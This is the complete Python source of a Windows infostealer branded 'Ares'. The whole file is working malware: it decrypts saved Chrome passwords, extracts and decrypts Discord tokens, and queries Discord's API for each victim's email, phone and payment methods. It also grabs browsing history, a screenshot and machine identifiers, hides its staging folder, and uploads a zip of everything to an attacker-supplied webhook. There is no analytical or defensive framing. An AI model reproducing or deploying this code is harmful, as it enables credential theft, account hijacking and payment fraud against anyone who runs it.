import os
import base64
import json
import browser_cookie3
import requests
import re
import win32crypt
import datetime
import win32con

from win32api import SetFileAttributes, GetSystemMetrics
from tempfile import TemporaryDirectory
from sqlite3 import connect
from getmac import get_mac_address as gma
from browser_history import get_history
from shutil import copyfile
from json import loads
from base64 import b64decode
from win32crypt import CryptUnprotectData
from random import choices
from string import ascii_letters, digits
from pyautogui import screenshot
from subprocess import Popen, PIPE
from Crypto.Cipher import AES
from prettytable import PrettyTable
from zipfile import ZipFile, ZIP_DEFLATED
from psutil import virtual_memory
from win32api import GetSystemMetrics

hk = "YOUR_WEBHOOK_HERE"  

def getip() -> str:
    return requests.get("https://api.ipify.org?format=text").text

ip = getip()

def get_screenshot(path):
    get_screenshot.scrn = screenshot()
    get_screenshot.scrn_path = os.path.join(
        path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png"
    )
    get_screenshot.scrn.save(get_screenshot.scrn_path)

def get_hwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def get_cpu_info():
    try:
        import cpuinfo
        return cpuinfo.get_cpu_info()
    except:
        return {
            "brand_raw": "Unknown",
            "hz_advertised_friendly": "0.0 GHz"
        }

def cookies_grabber_mod(u):
    cookies = []
    browsers = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]
    for browser in browsers:
        try:
            cookies.append(str(getattr(browser_cookie3, browser)(domain_name=u)))
        except BaseException:
            pass
    return cookies

def get_encryption_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "Local State",
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = loads(f.read())
    return CryptUnprotectData(
        b64decode(local_state["os_crypt"]["encrypted_key"])[5:], None, None, None, 0
    )[1]

def decrypt_data(data, key):
    try:
        return (
            AES.new(
                CryptUnprotectData(key, None, None, None, 0)[1],
                AES.MODE_GCM,
                data[3:15],
            )
            .decrypt(data[15:])[:-16]
            .decode()
        )
    except BaseException:
        try:
            return str(CryptUnprotectData(data, None, None, None, 0)[1])
        except BaseException:
            return ""

def find_His():
    table = PrettyTable(padding_width=1)
    table.field_names = ["CurrentTime", "Link"]
    for his in get_history().histories:

        if not isinstance(his, tuple) or len(his) != 2:
            continue

        a, b = his
        if len(b) <= 100:
            table.add_row([a, b])
        else:

            try:
                x_ = b.split("//")
                if len(x_) < 2:
                    continue

                x__, x___ = x_[1].count("/"), x_[1].split("/")
                if x___[0] != "www.google.com":
                    if x__ <= 5:
                        b = f"{x_[0]}//"
                        for p in x___:
                            if x___.index(p) != len(x___) - 1:
                                b += f"{p}/"
                        if len(b) <= 100:
                            table.add_row([a, b])
                        else:
                            table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
                    else:
                        b = f"{x_[0]}//{x___[0]}/[...]"
                        if len(b) <= 100:
                            table.add_row([a, b])
                        else:
                            table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
            except Exception:

                continue
    return table.get_string()

def get_Personal_data():

    try:
        ip_data = requests.get(f"http://ip-api.com/json/{ip}").json()
        return [ip, ip_data.get("country", "Unknown"), ip_data.get("city", "Unknown")]
    except:
        return [ip, "Unknown", "Unknown"]

PATHS = {
    "Discord": os.path.join(os.getenv("APPDATA"), "Discord", "Local Storage", "leveldb"),
    "Discord Canary": os.path.join(os.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
    "Discord PTB": os.path.join(os.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
    "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")
}

def getkey(path):
    try:
        with open(os.path.join(os.path.dirname(path), "..", "Local State"), "r", encoding="utf-8") as f:
            return json.loads(f.read())["os_crypt"]["encrypted_key"]
    except:
        return None

def gettokens(path):
    tokens = []
    try:
        for file_name in os.listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue

            try:
                with open(os.path.join(path, file_name), "r", encoding="utf-8", errors="ignore") as f:
                    for line in f.readlines():
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in re.findall(regex, line):
                                tokens.append(token)

                        for token in re.findall(r"dQw4w9WgXcQ:([^\"]*)", line):
                            tokens.append(f"dQw4w9WgXcQ:{token}")
            except:
                pass
    except:
        pass

    return tokens

def decrypt_token(encrypted_token, path):
    try:
        if not encrypted_token.startswith("dQw4w9WgXcQ:"):
            return encrypted_token

        token = encrypted_token.replace("\\", "") if encrypted_token.endswith("\\") else encrypted_token

        key = getkey(path)
        if not key:
            return None

        encrypted_key = base64.b64decode(key)[5:]
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        token_parts = token.split('dQw4w9WgXcQ:')[1]
        token_bytes = base64.b64decode(token_parts)

        nonce = token_bytes[3:15]
        ciphertext = token_bytes[15:]
        cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce)

        return cipher.decrypt(ciphertext)[:-16].decode()
    except Exception as e:
        return None

def af(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }

    user_info = {}

    try:
        response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        if response.status_code == 200:
            user_data = response.json()
            user_info["username"] = f"{user_data.get('username')}#{user_data.get('discriminator')}" 
            user_info["email"] = user_data.get("email")
            user_info["phone"] = user_data.get("phone")
            user_info["id"] = user_data.get("id")
            user_info["avatar"] = f"https://cdn.discordapp.com/avatars/{user_data.get('id')}/{user_data.get('avatar')}.png" if user_data.get('avatar') else None
    except:
        pass

    try:
        payment_response = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers)
        if payment_response.status_code == 200:
            payment_data = payment_response.json()
            payment_methods = []
            for method in payment_data:
                if method.get("type") == 1: 
                    payment_methods.append({
                        "type": "Credit Card",
                        "brand": method.get("brand"),
                        "last_4": method.get("last_4"),
                        "expires": f"{method.get('expires_month')}/{method.get('expires_year')}"
                    })
                elif method.get("type") == 2:
                    payment_methods.append({
                        "type": "PayPal",
                        "email": method.get("email")
                    })
            user_info["payment_methods"] = payment_methods
    except:
        pass

    return user_info

def create_embed(title=None, description=None, color=None):
    embed = {}
    if title:
        embed["title"] = title
    if description:
        embed["description"] = description
    if color is not None:
        embed["color"] = color
    return embed

def add_field(embed, name, value, inline=False):
    if "fields" not in embed:
        embed["fields"] = []

    if value and len(str(value)) > 1024:
        value = str(value)[:1021] + "..."

    if name and len(str(name)) > 256:
        name = str(name)[:253] + "..."

    embed["fields"].append({
        "name": name,
        "value": value,
        "inline": inline
    })

def set_thumbnail(embed, url):
    embed["thumbnail"] = {"url": url}

def set_author(embed, name, url=None, icon_url=None):
    author = {"name": name}
    if url:
        author["url"] = url
    if icon_url:
        author["icon_url"] = icon_url
    embed["author"] = author

def set_footer(embed, text, icon_url=None):
    footer = {"text": text}
    if icon_url:
        footer["icon_url"] = icon_url
    embed["footer"] = footer

def password_grab(dirpath):
    db_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "default",
        "Login Data",
    )
    chrome_psw_list = []
    if os.path.exists(db_path):
        key = get_encryption_key()
        filename = os.path.join(dirpath, "ChromeData.db")
        copyfile(db_path, filename)
        db = connect(filename)
        cursor = db.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        chrome_psw_list = []
        for url, user_name, pwd in cursor.fetchall():
            pwd_db = decrypt_data(pwd, key)
            if pwd_db:
                chrome_psw_list.append([user_name, pwd_db, url])
        cursor.close()
        db.close()

    return chrome_psw_list

def send_webhook(webhook_url, content=None, embeds=None, username=None, avatar_url=None, file_path=None, file_name=None):
    payload = {}
    if content:
        payload["content"] = content
    if embeds:
        payload["embeds"] = embeds
    if username:
        payload["username"] = username
    if avatar_url:
        payload["avatar_url"] = avatar_url

    if file_path and file_name:

        import random
        import string

        with open(file_path, "rb") as f:
            file_content = f.read()

        boundary = ''.join(random.choice(string.digits + string.ascii_letters) for i in range(16))

        headers = {
            'Content-Type': f'multipart/form-data; boundary=---------------------------{boundary}'
        }

        body_json = json.dumps(payload)

        data = f"-----------------------------{boundary}\r\n"
        data += f'Content-Disposition: form-data; name="payload_json"\r\n\r\n'
        data += f"{body_json}\r\n"
        data += f"-----------------------------{boundary}\r\n"
        data += f'Content-Disposition: form-data; name="file"; filename="{file_name}"\r\n'
        data += 'Content-Type: application/octet-stream\r\n\r\n'

        body = data.encode('utf-8') + file_content + f"\r\n-----------------------------{boundary}--".encode('utf-8')

        response = requests.post(webhook_url, headers=headers, data=body)
        return response
    else:
        headers = {
            "Content-Type": "application/json"
        }
        response = requests.post(webhook_url, json=payload, headers=headers, timeout=10)
        return response

def main():
    p_lst = get_Personal_data()
    cpuinfo = get_cpu_info()

    with TemporaryDirectory(dir=".") as td:
        try:
            SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
        except:
            pass

        get_screenshot(path=td)

        chrome_psw_list = password_grab(td)

        checked_tokens = []
        user_data = []

        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue

            for token in gettokens(path):
                decrypted_token = decrypt_token(token, path)
                if not decrypted_token or decrypted_token in checked_tokens:
                    continue

                checked_tokens.append(decrypted_token)
                account_info = af(decrypted_token)

                if account_info:
                    account_info["platform"] = platform
                    account_info["token"] = decrypted_token
                    user_data.append(account_info)

        chrome_psw_table = PrettyTable(padding_width=1)
        chrome_psw_table.field_names = ["Username / Email", "Password", "Website"]

        for entry in chrome_psw_list:
            chrome_psw_table.add_row(entry)

        files_to_create = [
            [os.path.join(td, "Chrome Passwords.txt"), chrome_psw_table.get_string() if chrome_psw_list else "No passwords found"]
        ]

        for file_path, content in files_to_create:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(content)

        all_files = [
            os.path.join(td, "History.txt"),
            get_screenshot.scrn_path
        ]

        with open(all_files[0], "w") as f:
            f.write(find_His())

        zip_path = os.path.join(td, "data.zip")
        with ZipFile(zip_path, mode="w", compression=ZIP_DEFLATED) as zip:
            for file_path in all_files:
                try:
                    zip.write(file_path)
                except FileNotFoundError:
                    pass

            for file_path, _ in files_to_create:
                if os.path.exists(file_path):
                    zip.write(file_path)

        ares_color = 0xC80815
        embeds = []

        system_embed = create_embed(
            title="🖥️ System Information",
            description="Detailed system information collected",
            color=ares_color
        )

        system_embed["timestamp"] = datetime.datetime.utcnow().isoformat()

        add_field(system_embed, "👤 PC Username", f"`{os.getenv('UserName')}`", inline=True)
        add_field(system_embed, "💻 PC Name", f"`{os.getenv('COMPUTERNAME')}`", inline=True)
        add_field(system_embed, "🖥️ OS", f"`{os.name} Windows`", inline=True)
        add_field(system_embed, "🌐 IP", f"`{p_lst[0]}`", inline=True)
        add_field(system_embed, "🌍 Country", f"`{p_lst[1]}`", inline=True)
        add_field(system_embed, "🏙️ City", f"`{p_lst[2]}`", inline=True)
        add_field(system_embed, "🔌 MAC", f"`{gma()}`", inline=True)
        add_field(system_embed, "🪛 HWID", f"`{get_hwid()}`", inline=True)

        cpu_brand = cpuinfo.get('brand_raw', 'Unknown')
        cpu_speed = 'Unknown'
        try:
            cpu_speed = f"{round(float(cpuinfo.get('hz_advertised_friendly', '0 GHz').split(' ')[0]), 2)} GHz"
        except:
            pass

        add_field(
            system_embed, 
            "🖲️ PC Components", 
            f"**CPU:** `{cpu_brand} - {cpu_speed}`\n"
            f"**RAM:** `{round(virtual_memory().total / (1024.0 ** 3), 2)} GB`\n"
            f"**Resolution:** `{GetSystemMetrics(0)}x{GetSystemMetrics(1)}`",
            inline=False
        )

        add_field(
            system_embed,
            "📊 Data Collected",
            f"**Chrome Passwords:** `{len(chrome_psw_list)}`\n"
            f"**Discord Accounts:** `{len(user_data)}`",
            inline=False
        )

        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        set_footer(system_embed, f"Captured at {current_time} • Powered by Ares", "https://i.imgur.com/Mewaogf.png")
        set_author(system_embed, "Ares System Information", None, "https://i.imgur.com/Mewaogf.png")

        embeds.append(system_embed)

        if chrome_psw_list:
            passwords_embed = create_embed(
                title="🔑 Chrome Passwords",
                description=f"Found {len(chrome_psw_list)} saved passwords",
                color=ares_color
            )

            passwords_embed["timestamp"] = datetime.datetime.utcnow().isoformat()

            password_list = ""
            for i, pwd in enumerate(chrome_psw_list[:5]):
                password_list += f"**{i+1}.** Website: `{pwd[2]}`\n"
                password_list += f"   Username: `{pwd[0]}`\n"
                password_list += f"   Password: `{pwd[1]}`\n\n"

            if len(chrome_psw_list) > 5:
                password_list += f"*... and {len(chrome_psw_list) - 5} more (see attached file)*"

            add_field(passwords_embed, "💾 Saved Credentials", password_list or "`None`", inline=False)

            set_footer(passwords_embed, f"Captured at {current_time} • Powered by Ares", "https://i.imgur.com/Mewaogf.png")
            set_author(passwords_embed, "Chrome Passwords", None, "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Google_Chrome_icon_%28February_2022%29.svg/1200px-Google_Chrome_icon_%28February_2022%29.svg.png")

            embeds.append(passwords_embed)

        for user in user_data:
            discord_embed = create_embed(
                title=f"🔰 Discord Account Found",
                description=f"🎮 Account information captured from **{user.get('platform')}**",
                color=ares_color
            )

            discord_embed["timestamp"] = datetime.datetime.utcnow().isoformat()

            add_field(discord_embed, "👤 Username", f"`{user.get('username', 'N/A')}`", inline=True)
            add_field(discord_embed, "🆔 User ID", f"`{user.get('id', 'N/A')}`", inline=True)
            add_field(discord_embed, "📧 Email", f"`{user.get('email', 'N/A')}`", inline=True)
            add_field(discord_embed, "🛜 IP", f"`{ip}`", inline=True)
            add_field(discord_embed, "📱 Phone", f"`{user.get('phone', 'None')}`" if user.get('phone') else "`None`", inline=True)

            nitro_status = "No Nitro"
            try:
                response = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", 
                                      headers={"Authorization": user.get("token")})
                if response.status_code == 200 and response.json():
                    nitro_status = "✅ Nitro"
                else:
                    nitro_status = "❌ No Nitro"
            except:
                pass

            add_field(discord_embed, "⭐ Nitro Status", nitro_status, inline=True)

            try:
                guilds_response = requests.get("https://discord.com/api/v9/users/@me/guilds", 
                                             headers={"Authorization": user.get("token")})
                if guilds_response.status_code == 200:
                    guild_count = len(guilds_response.json())
                    add_field(discord_embed, "🌐 Servers", f"`{guild_count}`", inline=True)
            except:
                add_field(discord_embed, "🌐 Servers", "`Unknown`", inline=True)

            if user.get("payment_methods"):
                payment_info = ""
                for method in user.get("payment_methods"):
                    if method.get("type") == "Credit Card":
                        payment_info += f"💳 **{method.get('brand')}** ending in *{method.get('last_4')}*\n"
                        payment_info += f"   ⏳ Expires: {method.get('expires')}\n"
                    elif method.get("type") == "PayPal":
                        payment_info += f"<:paypal:1234567890> **PayPal**: {method.get('email')}\n"

                add_field(discord_embed, "💰 Payment Methods", payment_info or "`None`", inline=False)
            else:
                add_field(discord_embed, "💰 Payment Methods", "`None`", inline=False)

            token = user.get("token", "N/A")
            if token != "N/A":
                add_field(discord_embed, "🔑 Token", f"```{token}```", inline=False)
            else:
                add_field(discord_embed, "🔑 Token", "`N/A`", inline=False)

            if user.get("avatar"):
                set_thumbnail(discord_embed, user.get("avatar"))

            platform_icons = {
                "Discord": "https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png",
                "Discord Canary": "https://cdn.discordapp.com/attachments/1062323324698939392/1062323501688184934/canary.png",
                "Discord PTB": "https://cdn.logojoy.com/wp-content/uploads/20210422095037/discord-mascot.png",
                "Chrome": "https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Google_Chrome_icon_%28February_2022%29.svg/1200px-Google_Chrome_icon_%28February_2022%29.svg.png"
            }

            platform = user.get("platform")
            set_author(discord_embed, f"Captured from {platform}", None, platform_icons.get(platform))
            set_footer(discord_embed, f"Captured at {current_time} • Powered by Ares", "https://i.imgur.com/Mewaogf.png")

            embeds.append(discord_embed)

        send_webhook(
            hk,
            embeds=embeds,
            username="Ares",
            avatar_url="https://i.imgur.com/Mewaogf.png",
            file_path=zip_path,
            file_name=f"Ares-{os.getenv('UserName')}.zip"
        )

        return embeds

if __name__ == "__main__":
    main()
